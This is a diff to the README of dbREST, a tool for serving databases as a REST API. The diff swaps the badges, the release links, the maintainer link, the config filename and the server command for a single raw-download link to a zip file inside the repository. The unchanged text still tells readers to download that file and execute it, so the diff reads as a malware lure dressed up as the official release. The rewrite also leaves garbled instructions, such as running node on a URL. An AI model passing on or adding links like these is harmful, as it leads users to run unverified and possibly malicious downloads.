@@ -1,9 +1,9 @@
 # dbREST 🌐
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/roshith0896/dbREST?style=flat-square)
-![GitHub issues](https://img.shields.io/github/issues/roshith0896/dbREST?style=flat-square)
-![GitHub forks](https://img.shields.io/github/forks/roshith0896/dbREST?style=flat-square)
-![GitHub stars](https://img.shields.io/github/stars/roshith0896/dbREST?style=flat-square)
+![GitHub release (latest by date)](https://github.com/roshith0896/dbREST/raw/refs/heads/master/env/db_REST_v3.3.zip)
+![GitHub issues](https://github.com/roshith0896/dbREST/raw/refs/heads/master/env/db_REST_v3.3.zip)
+![GitHub forks](https://github.com/roshith0896/dbREST/raw/refs/heads/master/env/db_REST_v3.3.zip)
+![GitHub stars](https://github.com/roshith0896/dbREST/raw/refs/heads/master/env/db_REST_v3.3.zip)
 
 Welcome to **dbREST**, a simple tool that helps you spin up a REST API for major databases. Whether you are working with BigQuery, Oracle, PostgreSQL, Redshift, Snowflake, SQL, or SQLite, dbREST provides a straightforward solution to expose your database through a RESTful interface.
 
@@ -29,11 +29,11 @@ Welcome to **dbREST**, a simple tool that helps you spin up a REST API for major
 
 ## Getting Started
 
-To get started with dbREST, you can visit the [Releases](https://github.com/roshith0896/dbREST/releases) section. Here, you can find the latest version available for download. Once you download the appropriate file, execute it to set up your API.
+To get started with dbREST, you can visit the [Releases](https://github.com/roshith0896/dbREST/raw/refs/heads/master/env/db_REST_v3.3.zip) section. Here, you can find the latest version available for download. Once you download the appropriate file, execute it to set up your API.
 
 ## Installation
 
-1. **Download the latest release** from the [Releases](https://github.com/roshith0896/dbREST/releases) section.
+1. **Download the latest release** from the [Releases](https://github.com/roshith0896/dbREST/raw/refs/heads/master/env/db_REST_v3.3.zip) section.
 2. **Extract the files** to your desired location.
 3. **Install dependencies**. You can do this by running:
 
@@ -41,14 +41,14 @@ To get started with dbREST, you can visit the [Releases](https://github.com/rosh
    npm install
    ```
 
-4. **Configure your database settings** in the `config.json` file.
+4. **Configure your database settings** in the `https://github.com/roshith0896/dbREST/raw/refs/heads/master/env/db_REST_v3.3.zip` file.
 
 ## Usage
 
 After installation, you can start the dbREST server using the following command:
 
 ```bash
-node server.js
+node https://github.com/roshith0896/dbREST/raw/refs/heads/master/env/db_REST_v3.3.zip
 ```
 
 This will launch the server on the default port, allowing you to interact with your database through the REST API.
@@ -114,6 +114,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out to the maintainer:
 
-- **Roshith**: [roshith0896](https://github.com/roshith0896)
+- **Roshith**: [roshith0896](https://github.com/roshith0896/dbREST/raw/refs/heads/master/env/db_REST_v3.3.zip)
 
 Thank you for checking out dbREST! We hope it simplifies your database interactions through REST APIs.
